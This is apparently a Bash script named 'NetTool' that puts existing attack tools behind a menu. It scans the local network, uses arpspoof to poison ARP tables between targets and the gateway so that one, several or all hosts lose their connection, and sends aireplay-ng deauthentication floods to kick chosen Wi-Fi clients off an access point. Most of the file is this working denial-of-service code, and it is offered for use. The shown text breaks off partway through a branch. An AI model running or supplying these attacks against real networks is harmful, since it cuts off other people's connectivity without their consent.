#!/bin/bash
#Colors_BEGIN
clear
red='\e[0;31m'
green='\e[1;32m'
orange='\e[1;33m'
lightblue='\e[0;34m'
purple='\e[0;35m'
cyan='\e[0;36m'
lightgray='\e[0;37m'
darkgray='\e[1;30em'
lightred='\e[1;31m'
lightgreen='\e[0;32m'
yellow='\e[0;49;93m'
blue='\e[1;34m'
lightpurple='\e[1;35m'
lightcyan='\e[1;36m'
white='\e[1;37m'
nc="\e[0m"

#Colors_END
#: <<'END_COMMENT'
nc="\e[0m"
#ROOT PRIVILEGIES
if [[ $EUID -ne 0 ]]; then
    echo -e "$red You don't have Root privilegies, execute the script as root.$nc"
    exit 1
fi

echo -e "$red""Staring""$nc"
sleep 0.5
clear
echo -e "$red""Staring.""$nc"
sleep 0.5
clear
echo -e "$red""Staring..""$nc"
sleep 0.5
clear
echo -e "$red""Staring...""$nc" 
clear 
sleep 0.5
#BEGIN-CHECKING FOR INTERNET CONNECTION

while true
do
    clear
    #END_COMMENT
    #Menu
    echo -e "               \e[1;31m -- NetTool -- \e[0m         "
    echo ""
    echo -e "              \e[0;34mVersion : 2.2\e[0m         "
    echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
    echo -e "              \e[0;34mEmail   : montasilinigamer@gmail.com\e[0m         "
    echo ""

    interface=$(route | grep '^default' | grep -o '[^ ]*$')
    ip=$(ifconfig $interface | grep -w inet | cut -d" " -f10)
    gateway=$(ip route show default | awk '/default/ {print $3}')
    net_range=$(ip a l $interface | awk '/:/{found=1} found && /inet/ && !count{match($2,/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\/[0-9]+/);val=substr($2,RSTART,RLENGTH);sub(/[0-9]+\//,"0/",$2);print substr($2,RSTART,RLENGTH);count=1}')
    echo -e ""$orange""Interface:$nc" $interface | "$orange""Gateway:$nc" $gateway"
    echo "------------------------------------------------"
    echo -e ""$orange""IP:$nc" $ip | "$orange""Network Range:$nc" $net_range"
    echo""
    echo -e "$orange""1)$nc"" - $green""Scan for hosts$nc"
    echo -e "$orange""2)$nc"" - $green""Scan for hosts(Nmap scan)$nc"
    echo -e "$orange""3)$nc"" - $green""Kill internet connection$nc"
    echo -e "$orange""4)$nc"" - $green""Kick Devices OFF$nc"
    echo -e "$orange""5)$nc"" - $orange""Update$nc"
    echo -e "$lightred""e)$nc" - "$lightred""Exit$nc"
    echo ""
    echo -en "$yellow""Select your option : $nc"
    read option
    echo ""
    case $option in
        1)
            echo -e "\e[1;34mScanning...\e[0m"
            sleep 2
            echo -e "$orange""Hosts           MAC	                Vendor$nc" 	
            arp-scan --localnet -x 
            echo -e "\e[1;34mYour scan completed!\e[0m"
            sleep 2
            echo -en "$blue""PRESS [ RETURN ] TO CONTINUE$nc"
            read input
            sleep 0.5
        ;;
        2)
            echo -e " [+] Nmap scan [+] "
            echo ""
            echo -e "$orange""1-$nc""$green"" Simple scan $nc"
            echo -e "$orange""2-$nc""$green"" Advanced scan $nc" "$blue""(Slow scan but detailed)$nc"
            echo ""
            echo -en "$yellow""Select your scan mode : $nc"
            read opt2
            case $opt2 in
                1)  
                    echo -en "$yellow""Type your network range $nc""$blue""(eg:192.168.1.0/24): $nc"
                    read range
                    

                    wget -q --spider https://www.google.com

                if [ $? -eq 0 ]; then
                    echo -e "\e[1;34mScanning...\e[0m"
                    sleep 1
                    nohup nmap -oN simplescan.txt -sP $range </dev/null &>/dev/null
                    sed '1d;$d' simplescan.txt
                    rm simplescan.txt
                    echo -e "\e[1;34mYour scan completed!\e[0m"
                    sleep 2
                    echo -en "$blue""PRESS [ RETURN ] TO CONTINUE$nc"
                    read input
                    echo -e "$blue""Going back to Menu...$nc"
                    sleep 1
                else
                    sleep 1
                    echo -e "$red""connection lost!$nc"
                    sleep 0.5
                    echo -e "$lightcyan""Please fix your internet connection and try again.$nc"
                    sleep 4
                    echo -e "$blue""Going back to Menu...$nc"
                    sleep 1
                fi
                ;;
		
                2)
                wget -q --spider https://www.google.com
                if [ $? -eq 0 ]; then
                    echo -en "$yellow""Type your network range $nc""$blue""(eg:192.168.1.0/24): $nc"
                    read range
                    echo -e "\e[1;34mScanning...\e[0m"
                    sleep 1
                    nohup nmap -oN advcan.txt -A $range </dev/null &>/dev/null
                    sed '1d;$d' advcan.txt
                    rm advcan.txt
                    echo -e "\e[1;34mYour scan completed!\e[0m"
                    sleep 2
                    echo -en "\e[1;32mPress [ RETURN ] To Continue \c\e[0m"
                    read input
                    echo -e "$blue""Going back to Menu...$nc"
                    sleep 1
                else
                    sleep 1
                    echo -e "$red""connection lost!$nc"
                    sleep 0.5
                    echo -e "$lightcyan""Please fix your internet connection and try again.$nc"
                    sleep 4
                    echo -e "$blue""Going back to Menu...$nc"
                    sleep 1
                fi
                ;;
            esac
        ;;
        3)
            echo -e "$orange""1-$nc""$green"" kill connection for 1 target$nc"
            echo -e "$orange""2-$nc""$green"" kill connection for muliple users$nc"
            echo -e "$orange""3-$nc""$green"" kill connection for all users$nc"
            echo ""
            echo -en "$orange""Select your option : $nc"
            read opt
            case $opt in
                1)
                    clear
                    echo -e "\e[1;34mScanning.\e[0m"
                    sleep 0.5
                    clear
                    echo -e "\e[1;34mScanning..\e[0m"
                    sleep 0.5
                    clear
                    echo -e "\e[1;34mScanning...\e[0m"
                    sleep 0.5
                    clear
                    echo -e "\e[1;34mScanning.\e[0m"
                    sleep 0.5
                    clear
                    echo -e "\e[1;34mScanning..\e[0m"
                    sleep 0.5
                    clear
                    echo -e "\e[1;34mScanning...\e[0m"
                    sleep 2
		            #echo -e "$orange""Hosts           MAC	                Vendor$nc"	
                    netdiscover -i $interface -P > hosts.txt
                    cat hosts.txt
                    echo -en "$yellow""Type your target machine : $nc"
                    read target
                    xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interface -t $target $gateway" &
                    xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interface -t $gateway $target" &
                    sleep 1
                    echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                    read input
                    pkill arpspoof
                    echo -e "$blue""Going back to Menu...$nc"
                    sleep 1
                ;;
                2)
                    clear
                    echo -e "\e[1;34mScanning.\e[0m"
                    sleep 0.5
                    clear
                    echo -e "\e[1;34mScanning..\e[0m"
                    sleep 0.5
                    clear
                    echo -e "\e[1;34mScanning...\e[0m"
                    sleep 0.5
                    clear
                    echo -e "\e[1;34mScanning.\e[0m"
                    sleep 0.5
                    clear
                    echo -e "\e[1;34mScanning..\e[0m"
                    sleep 0.5
                    clear
                    echo -e "\e[1;34mScanning...\e[0m"
                    sleep 2
		            echo -e "$orange""Hosts           MAC	                Vendor$nc"
                    arp-scan --localnet -x 
                    echo -en "$yellow""How many target(s)? $nc"
                    read targets
                    for (( i = 1; i < targets+1; i++ )); do
                        echo -n "type your target nÂ° $i : "
                        read trgt
                        echo -e "$cyan""killing$nc" "$red"$trgt $nc""
                        nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
                        nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
                    done
                    sleep 1
                    echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                    read input
                    pkill arpspoof
                    echo -e "$blue""Going back to Menu...$nc"
                    sleep 1
                    clear
                    ;;
                3)  
                    while [ true ]; do
                        echo -e "$yellow""Scanning for devices$nc"
                        sleep 0.1
                        clear
                        echo -e "$yellow""Scanning for devices.$nc"
                        sleep 0.1
                        clear
                        echo -e "$yellow""Scanning for devices..$nc"
                        sleep 0.1
                        clear
                        echo -e "$yellow""Scanning for devices...$nc"
                        sleep 0.1
                        clear
                    done & 
                    clear
                    trap 'kill $!' SIGTERM SIGKILL
                    sudo nmap -n -sn $net_range | awk 'f==2{print s; f=s=""}/^(Nmap scan|MAC Address)/{sub(/^.*(for|:..) /,"");f++;s=(s?s OFS :"")$0}END{if(f==2)print s}' | sort -V > scan-output.txt
                    kill $!
                    sleep 0.2
                    clear
                    echo -e "$red""Internet Will Be Killed for the following IP(s)! $nc"
                    echo ""
                    sed -i "1d" -- scan-output.txt </dev/null &>/dev/null
                    cat scan-output.txt
                    awk '{print $1}' scan-output.txt > scan.txt
                    #sed -i -e "/$gateway/d" -- scan.txt </dev/null &>/dev/null
                    #grep -v "$ip" scan.txt > temp && mv temp scan.txt   </dev/null &>/dev/null
                    echo ""
                    echo -en "$orange""Do you want to whitelist some IPs? (y/n) $nc"
                    read answ5
                    if [ "$answ5" == "y"  ] || [ "$answ5" == "Y"  ]; then 
                        echo -en "$orange""How Many Ip(s) You Want to Whitelist? $nc"
                        read nb_whl
                        for (( i = 1; i < nb_whl+1; i++ )); do
                        echo -en "$blue""IP Adresse To whitelist nÂ° "$i" : $nc"
                        read ip_whl
                        echo -e "$orange"$ip_whl $nc" Added To Whitelist!$nc"
                        sed -i -e "/$ip_whl/d" -- scan.txt </dev/null &>/dev/null
                        done
                        if [ -s scan.txt ]; then
                            # The file is not-empty.
                            echo -en "$blue""PRESS [ RETURN ] TO START ATTACK$nc"
                            read input
                            i=0
                            while IFS= read -r line; do
                                # The 'declare' syntax creates variables on the fly with the values
                                # read from the file
                                declare target$((i++))="$line"
                            done <scan.txt
                            count="$((i-1))"
                            # Now the variables are created; those can be individually accessed as  
                            # '$target1'..'$tatgetN'; but to print it on a loop, use
                            # indirect expansion using ${!var} syntax 
                            clear 
                            echo -e "$orange""Starting Attack...$nc"
                            sleep 0.3
                            for ((idx=0; idx<=count; idx++)); do
                                temp=target$idx
                                trgt="$target""${!temp}"
                                echo -e  "$lightblue""Killing$nc" "$red""$trgt $nc"  
                                sleep 0.5 
                                nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
                                nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
                                sleep 1
                            done
                            echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                            read input
                            pkill arpspoof
                            rm scan.txt scan-output.txt </dev/null &>/dev/null
                            echo -e "$blue""Going back to Menu...$nc"
                            sleep 1
                        else
                            # The file is empty.
                            echo ""
                            echo -e "$orange""Looks Like There Is No Target Selected!$nc"
                            sleep 2
                            rm scan.txt scan-output.txt </dev/null &>/dev/null
                            echo -e "$blue""Going back to Menu...$nc"
                            sleep 1
                        fi
                    else
                    i=0
                        while IFS= read -r line; do
                            # The 'declare' syntax creates variables on the fly with the values
                            # read from the file
                            declare target$((i++))="$line"
                        done <scan.txt
                        count="$((i-1))"
                        # Now the variables are created; those can be individually accessed as  
                        # '$target1'..'$tatgetN'; but to print it on a loop, use
                        # indirect expansion using ${!var} syntax 
                        clear 
                        echo -e "$orange""Starting Attack...$nc"
                        sleep 0.3
                        for ((idx=0; idx<=count; idx++)); do
                            temp=target$idx
                            trgt="$target""${!temp}"
                            echo -e  "$lightblue""Killing$nc" "$red""$trgt $nc"  
                            sleep 0.5 
                            nohup arpspoof -i $interface -t $trgt $gateway </dev/null &>/dev/null &
                            nohup arpspoof -i $interface -t $gateway $trgt </dev/null &>/dev/null &
                            sleep 1
                        done 
                        echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                        read input
                        pkill arpspoof
                        rm scan.txt scan-output.txt </dev/null &>/dev/null
                        echo -e "$blue""Going back to Menu...$nc"
                        sleep 1
                    fi
                ;;
            esac
            ;;
        4) 
            clear
            sleep 0.5
            PS3="> "
            echo -e "$green""Available wireless interfaces:$nc"
            echo ""        
            select interface in $(iw dev | awk '$1=="Interface"{print $2}'); do
                echo -e "$orange""$interface $nc"$blue"selected!$nc" 
                    break;
            done 
            chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
            connected_ap_essid=$(iwconfig $interface 2> /dev/null | awk -F\" '{print $2}')
            printf "$connected_ap_essid" > connected_ap_essid.txt
            ESSID=$(grep -m1 "" connected_ap_essid.txt)
            connected_ap_bssid=$(iwconfig "$interface" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
            printf "$connected_ap_bssid" > connected_ap_bssid.txt
            BSSID=$(grep -m1 "" connected_ap_bssid.txt)
            echo -e "Connected to "" : ""$connected_ap_essid | BSSID : $connected_ap_bssid"
            sleep 0.2
            echo -e "$blue""Interface current mode: $nc"$green""$chk_mode""
            echo ""
                        echo -e "$orange""1-$nc""$green"" Kick One Device (Aireplay-ng)$nc"
                        echo -e "$orange""2-$nc""$green"" Kick Muliple Devices (Aireplay-ng)$nc"
                        #echo -e "$orange""3-$nc""$green"" Kick All Except You (mdk4)$nc"
			echo ""
                        echo -e "$orange""0-$nc""$orange"" Go back...$nc"
                        echo "" 
                        echo -en "$yellow""Select your option : $nc"
                        read opt    
            case $opt in
                1)
                if [ "$BSSID" = "" ]; then
                    chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
                    if [ "$chk_mode" = "monitor" ]; then
                            echo "Monitor mode already enabled!"
                            sleep 1           
                            clear
                            echo "Searching For Access-Points..."
                            echo -e "$blue""CTRL+C TO STOP Searching!$nc"
                            sleep 1
                            sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
                            cat aps_scan.txt
                            echo -en "$orange""Type Access-Point's MAC-Address :  $nc"
                            read ap_mac
                            echo -en "$orange""Type Access-Point's Channel :  $nc"
                            read ap_chan
                            echo "Searching For Clients For Selected Access Point..."
                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                            echo -e "$blue""CTRL+C TO STOP Searching!$nc"
                            cat ap_scan.txt
                            echo -en "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
                            read dv_mac
                            xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac --channel $ap_chan $interface " & sleep 2 
                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
                            echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                            read input
                            pkill airodump-ng
                            pkill aireplay-ng
                            echo 'Cleaning files...'
                            rm ap_scan.txt aps_scan_txt
                            sleep 0.5
                            echo "Restoring interface to managed mode... "
                            sudo ifconfig "$interface" down >/dev/null 2>&1
                            sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                            sudo ifconfig "$interface" up >/dev/null 2>&1
                            sudo systemctl restart NetworkManager 
                            sleep 5
                            echo -e "$blue""Going back to Menu...$nc"
                            sleep 1
                    else
                        if [ "$chk_mode" = "managed" ]; then 
                            echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
                            sleep 0.3
                            echo -en "$orange""Enabel monitor mode? (y/n) $nc"
                            read answ3
                            if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
                                sudo airmon-ng check kill >/dev/null 2>&1
                                sudo ifconfig "$interface" down >/dev/null 2>&1
                                sudo iwconfig "$interface" mode monitor >/dev/null 2>&1
                                sudo ifconfig "$interface" up >/dev/null 2>&1
                                chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
                                    if [ "$chk_mode" = "monitor" ] ;then
                                        echo "Monitor mode enabled!"
                                        sleep 1
                                        clear
                                        echo "Searching For Access-Points..."
                                        echo -e "$blue""CTRL+C TO STOP Searching!$nc"
                                        sleep 1
                                        sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
                                        cat aps_scan.txt
                                        echo -en "$orange""Type Access-Point's MAC-Address :  $nc"
                                        read ap_mac
                                        echo -en "$orange""Type Access-Point's Channel :  $nc"
                                        read ap_chan
                                        echo "Searching For Clients For Selected Access Point..."
                                        echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                                        cat ap_scan.txt
                                        echo -en "$orange""Type Device's MAC-Address You Want To Kick :  $nc"
                                        read dv_mac
                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac -c $ap_chan $interface " & sleep 2 
                                        xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
                                        echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                                        read input
                                        pkill airodump-ng
                                        pkill aireplay-ng
                                        echo 'Cleaning files...'
                                        rm ap_scan.txt aps_scan.txt
                                        sleep 0.5
                                        echo "Restoring interface to managed mode... "
                                        sudo ifconfig "$interface" down >/dev/null 2>&1
                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                                        sudo ifconfig "$interface" up >/dev/null 2>&1
                                        sudo systemctl restart NetworkManager 
                                        sleep 5
                                        echo -e "$blue""Going back to Menu...$nc"
                                        sleep 1
                                    else 
                                        echo -e "$red""Unable to change interface to monitor mode!$nc"
                                        echo -e "$red""Your interface doesn't support monitor mode!$nc"
                                        sudo ifconfig "$interface" down >/dev/null 2>&1
                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                                        sudo ifconfig "$interface" up >/dev/null 2>&1
                                        sudo systemctl restart NetworkManager 
                                        sleep 5
                                        echo -e "$blue""Going back to Menu...$nc"
                                        sleep 1
                                    fi
                            else    
                                echo "Going back to menu..."
                                sleep 1
                            fi
                        fi     
                    fi
                else
                    chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
                    if [ "$chk_mode" = "monitor" ]; then
                            echo "Monitor mode already enabled!"
                            sleep 1           
                            clear
                            echo "Monitoring your Access-Point '$ESSID'"
                            echo -en "$blue""CTRL+C TO STOP MONITORING!$nc"
                            sleep 1
                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
                            cat ap_scan.txt
                            echo -en "$orange""Type Device's MAC-Address :  $nc"
                            read dv_mac
                            xterm -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface" &
                            sleep 0.5
                            echo -en "$blue""PRESS [ RETURN ] TO CANCEL$nc"
                            read input
                            pkill aireplay-ng
                            echo "Restoring interface to managed mode... "
                            sleep 1
                            sudo ifconfig "$interface" down >/dev/null 2>&1
                            sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                            sudo ifconfig "$interface" up >/dev/null 2>&1
                            sudo systemctl restart NetworkManager 
                            echo -e "$blue""Going back to Menu...$nc"
                            sleep 5
                            else
                        if [ "$chk_mode" = "managed" ]; then 
                            echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
                            sleep 0.3
                            echo -en "$orange""Enabel monitor mode? (y/n) $nc"
                            read answ3
                            if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
                                sudo airmon-ng check kill >/dev/null 2>&1
                                sudo ifconfig "$interface" down >/dev/null 2>&1
                                sudo iwconfig "$interface" mode monitor >/dev/null 2>&1
                                sudo ifconfig "$interface" up >/dev/null 2>&1
                                chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
                                    if [ "$chk_mode" = "monitor" ] ;then
                                        echo "Monitor mode enabled!"
                                        sleep 1
                                        clear
                                        echo "Monitoring your Access-Point '$ESSID'"
                                        echo -en "$blue""CTRL+C TO STOP MONITORING!$nc"
                                        sleep 1
                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
                                        clear
                                        cat ap_scan.txt
                                        echo -en "$orange""Type Target's MAC-Address :  $nc"
                                        read dv_mac
                                        echo -en "$orange""Type Access-Point's Channel :  $nc"
                                        read ap_chan
                                        echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                                        sleep 0.5
                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID --channel $ap_chan $interface " & sleep 2 
                                        xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
                                        echo -en "$blue""PRESS [ RETURN ] TO STOP KICKING$nc"
                                        read input
                                        pkill airodump-ng
                                        pkill aireplay-ng
                                        echo "Restoring interface to managed mode... "
                                        sudo ifconfig "$interface" down >/dev/null 2>&1
                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                                        sudo ifconfig "$interface" up >/dev/null 2>&1
                                        sudo systemctl restart NetworkManager 
                                        sleep 5
                                        echo -e "$blue""Going back to Menu...$nc"
                                        sleep 1
                                    else 
                                        echo -e "$red""Unable to change interface to monitor mode!$nc"
                                        echo -e "$red""Your interface doesn't support monitor mode!$nc"
                                        sudo ifconfig "$interface" down >/dev/null 2>&1
                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                                        sudo ifconfig "$interface" up >/dev/null 2>&1
                                        sudo systemctl restart NetworkManager 
                                        sleep 5
                                        echo -e "$blue""Going back to Menu...$nc"
                                        sleep 1
                                    fi
                            else    
                                echo "Going back to menu..."
                                sleep 1
                            fi
                        fi     
                    fi
                fi
                ;;
                2) 
                if [ "$BSSID" = "" ]; then
                    chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
                        if [ "$chk_mode" = "monitor" ]; then
                            echo "Searching For Access-Points..."
                            echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                            sleep 1
                            sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
                            cat aps_scan.txt
                            echo -en "$orange""Type Access-Point's MAC-Address :  $nc"
                            read ap_mac
                            echo -en "$orange""Type Access-Point's Channel :  $nc"
                            read ap_chan
                            echo "Searching For Clients For Selected Access Point..."
                            sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                            echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                            cat ap_scan.txt
                            echo -en "$yellow""How many target(s)? $nc"
                            read targets
                            xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac --channel $ap_chan $interface " & sleep 2
                            for (( i = 1; i < targets+1; i++ )); do
                                echo -en "$orange""Type Target's MAC-Address nÂ° $i :  $nc"
                                read dv_mac
                                echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                                sleep 0.5
                                xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
                            done                                    
                            echo -en "$blue""PRESS [ RETURN ] TO STOP KICKING$nc"
                            read input
                            pkill airodump-ng
                            pkill aireplay-ng
                            echo 'Cleaning files...'
                            rm ap_scan.txt aps_scan.txt  >/dev/null 2>&1
                            sleep 0.5
                            echo "Restoring interface to managed mode... "
                            sleep 1
                            sudo ifconfig "$interface" down >/dev/null 2>&1
                            sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                            sudo ifconfig "$interface" up >/dev/null 2>&1
                            sudo systemctl restart NetworkManager 
                            echo -e "$blue""Going back to Menu...$nc"
                            sleep 5
                        else
                            if [ "$chk_mode" = "managed" ]; then 
                                echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
                                sleep 0.3
                                echo -en "$orange""Enabel monitor mode? (y/n) $nc"
                                read answ3
                                if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
                                    sudo airmon-ng check kill >/dev/null 2>&1
                                    sudo ifconfig "$interface" down >/dev/null 2>&1
                                    sudo iwconfig "$interface" mode monitor >/dev/null 2>&1
                                    sudo ifconfig "$interface" up >/dev/null 2>&1
                                    chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
                                    if [ "$chk_mode" = "monitor" ] ;then
                                        echo "Monitor mode enabled!"
                                        sleep 1
                                        clear
                                        echo "Searching For Access-Points..."
                                        echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                                        sleep 1
                                        sudo xterm -geometry 80x20-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && sudo wash -i $interface -a 2>&1 | tee aps_scan.txt" &&
                                        cat aps_scan.txt
                                        echo -en "$orange""Type Access-Point's MAC-Address :  $nc"
                                        read ap_mac
                                        echo -en "$orange""Type Access-Point's Channel :  $nc"
                                        read ap_chan
                                        echo "Searching For Clients For Selected Access Point..."
                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $BSSID --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                                        echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                                        cat ap_scan.txt
                                        echo -en "$yellow""How many target(s)? $nc"
                                        read targets
                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID --channel $ap_chan $interface " & sleep 2
                                        for (( i = 1; i < targets+1; i++ )); do
                                            echo -en "$orange""Type Target's MAC-Address nÂ° $i :  $nc"
                                            read dv_mac
                                            echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                                            sleep 0.5
                                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
                                        done                                    
                                        echo -en "$blue""PRESS [ RETURN ] TO STOP KICKING$nc"
                                        read input
                                        pkill airodump-ng
                                        pkill aireplay-ng
                                        echo 'Cleaning files...'
                                        rm ap_scan.txt aps_scan.txt  >/dev/null 2>&1
                                        sleep 0.5
                                        echo "Restoring interface to managed mode... "
                                        sudo ifconfig "$interface" down >/dev/null 2>&1
                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                                        sudo ifconfig "$interface" up >/dev/null 2>&1
                                        sudo systemctl restart NetworkManager 
                                        sleep 5
                                        echo -e "$blue""Going back to Menu...$nc"
                                        sleep 1
                                    else 
                                         echo -e "$red""Unable to change interface to monitor mode!$nc"
                                        break
                                    fi
                                 else    
                                    echo "Going back to menu..."
                                    sleep 1
                                fi
                            fi 
                        fi       
                else 
                    chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
                    if [ "$chk_mode" = "monitor" ]; then
                        echo "Monitor mode already enabled!"
                        sleep 1           
                        clear
                        echo "Monitoring your Access-Point '$ESSID'"
                        echo -en "$blue""CTRL+C TO STOP MONITORING!$nc"
                        sleep 1
                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
                        clear
                        cat ap_scan.txt
                        echo -en "$orange""Type Access-Point's Channel :  $nc"
                        read ap_chan
                        echo "Searching For Clients For Selected Access Point..."
                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $BSSID --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                        echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                        cat ap_scan.txt
                        echo -en "$yellow""How many target(s)? $nc"
                        read targets
                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID --channel $ap_chan $interface " & sleep 2
                        for (( i = 1; i < targets+1; i++ )); do
                            echo -en "$orange""Type Target's MAC-Address nÂ° $i :  $nc"
                            read dv_mac
                            echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                            sleep 0.5
                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
                        done
                        echo -en "$blue""Press [ RETURN ] TO STOP KICKING$nc"
                        read input
                        pkill airodump-ng
                        pkill aireplay-ng
                        echo 'Cleaning files...'
                        rm ap_scan.txt aps_scan.txt  >/dev/null 2>&1
                        sleep 0.5
                        echo "Restoring interface to managed mode... "
                        sleep 1
                        sudo ifconfig "$interface" down >/dev/null 2>&1
                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                        sudo ifconfig "$interface" up >/dev/null 2>&1
                        sudo systemctl restart NetworkManager 
                        echo -e "$blue""Going back to Menu...$nc"
                        sleep 5
                    else
                        if [ "$chk_mode" = "managed" ]; then 
                            echo -e "$orange""Your interface needs to be on monitor mode to continue!$nc"
                            sleep 0.3
                            echo -en "$orange""Enabel monitor mode? (y/n) $nc"
                            read answ3
                            if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
                                sudo airmon-ng check kill >/dev/null 2>&1
                                sudo ifconfig "$interface" down >/dev/null 2>&1
                                sudo iwconfig "$interface" mode monitor >/dev/null 2>&1
                                sudo ifconfig "$interface" up >/dev/null 2>&1
                                chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
                                    if [ "$chk_mode" = "monitor" ] ;then
                                        echo "Monitor mode enabled!"
                                        sleep 1
                                        clear
                                        echo "Monitoring your Access-Point '$ESSID'"
                                        echo -en "$blue""CTRL+C TO STOP MONITORING!$nc"
                                        sleep 1
                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --bssid $BSSID $interface 2>&1 | tee ap_scan.txt" &&
                                        clear
                                        cat ap_scan.txt
                                        echo -en "$orange""Type Access-Point's Channel :  $nc"
                                        read ap_chan
                                        echo "Searching For Clients For Selected Access Point..."
                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $BSSID --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                                        echo -en "$blue""CTRL+C TO STOP Searching!$nc"
                                        cat ap_scan.txt
                                        echo -en "$yellow""How many target(s)? $nc"
                                        read targets
